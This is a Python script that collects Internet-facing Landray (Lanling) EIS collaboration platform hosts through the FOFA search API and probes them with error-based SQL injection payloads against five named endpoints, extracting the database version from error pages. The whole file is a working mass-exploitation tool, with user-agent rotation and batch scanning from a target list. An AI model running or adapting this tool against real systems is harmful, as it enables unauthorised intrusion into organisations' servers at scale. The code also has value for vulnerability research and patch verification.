#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import random
import json
import argparse
import re
from bs4 import BeautifulSoup

def UA():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.3',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 EDGE/16.16299',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'
    ]
    random_user_agent = random.choice(user_agents)
    headers = random_user_agent
    return headers

def Target_collection(filename): # 目标收集
    urls = [
        "https://fofa.info/api/v1/search/all?email=xxxx&key=xxxx&qbase64=YXBwPSJMYW5kcmF5LUVJU+aZuuaFp+WNj+WQjOW5s+WPsCI%3D&size=9999" # app="Landray-EIS智慧协同平台"
        # 自行配置fofa邮箱和api key
    ]

    for url in urls:
        try:
            res = requests.get(url)
            respBody = res.text
            respBody = json.loads(respBody)
            if "results" in respBody:
                with open(filename, "a") as fp:
                    for ioc in respBody["results"]:
                        url = str(ioc[0])
                        if "http" not in url:
                            url = "http://" + str(url)
                        fp.write("{}\n".format(str(url)))
        except Exception as e:
            with open(filename + ".error", "a") as ferrorP:
                ferrorP.write(str(e) + "\n")

def Single_objective_testing(base_url): # 单目标检测
    url1 = "/frm/frm_button_func.aspx?formid=1%20and%201=@@version--+"
    url2 = "/third/DingTalk/Demo/ShowUserInfo.aspx?account=1'%20and%201=@@version--+"
    url3 = "/third/DingTalk/Pages/UniformEntry.aspx?moduleid=1%20and%201=@@version--+"
    url4 = "/flow/fl_define_flow_chart_show.aspx?id=1%20and%201=@@version--+"
    url5 = "/dossier/doc_fileedit_word.aspx?recordid=1'%20and%201=@@version--+&edittype=1,1"
    urls = [url1, url2, url3, url4, url5]
    header = {
        "User-Agent": UA(),
        "Connection": "close",
    }
    for path in urls:
        full_url = base_url + path
        # print(full_url)
        try:
            rqg = requests.post(full_url, headers=header, verify=False, allow_redirects=False, timeout=2)
            if rqg.status_code == 500 and "nvarchar" in rqg.text:
                soup = BeautifulSoup(rqg.text, 'html.parser')
                title_element = soup.find('title')
                version = re.search("\'.*\'", str(title_element), re.I)
                version = re.search("\'.*?<br/>", str(version[0]), re.I)
                sql = "数据库版本信息: " + str(version[0])
                msg = "存在漏洞"
                print(msg + " " + full_url + "\n" + sql +"\n+----------------------------------+")
            else:
                msg = "{} 不存在漏洞".format(full_url)
                # print(msg)
        except requests.Timeout:
            msg = "{} 超时 ({} 秒)".format(full_url, 2)
            # print(msg)
        except Exception as e:
            msg = "{} 报错: {}".format(full_url, str(e))
            # print(msg)

def Multi_objective_testing(file): # 多目标检查
    with open(file, "r") as f:
        lines = f.readlines()
        for url in lines:
            url = url.strip()
            if "https" not in url:
                Single_objective_testing(url)

def main():
    parser = argparse.ArgumentParser(description="### Lanling EIS Smart Collaboration Platform frm_ Button_ Func.aspx has an SQL injection vulnerability. ###")
    parser.add_argument("-t", "--target_collection", action="store_true", help="Perform target collection")
    parser.add_argument("-r", "--multi_objective_testing", metavar="FILE", help="Perform multi-objective testing. e.g:python Lanling_EIS_SQL_injection.py -r ./url.txt")
    parser.add_argument("-u", "--single_objective_testing", metavar="URL", help="Perform single-objective testing. e.g:python Lanling_EIS_SQL_injection.py -u http://xxx.xxx.xxx")

    args = parser.parse_args()

    if args.target_collection:
        Target_collection("./url.txt")
    elif args.multi_objective_testing:
        Multi_objective_testing(args.multi_objective_testing)
    elif args.single_objective_testing:
        Single_objective_testing(args.single_objective_testing)
    else:
        print("No valid options provided. Use -h for help.")

if __name__ == "__main__":
    main()
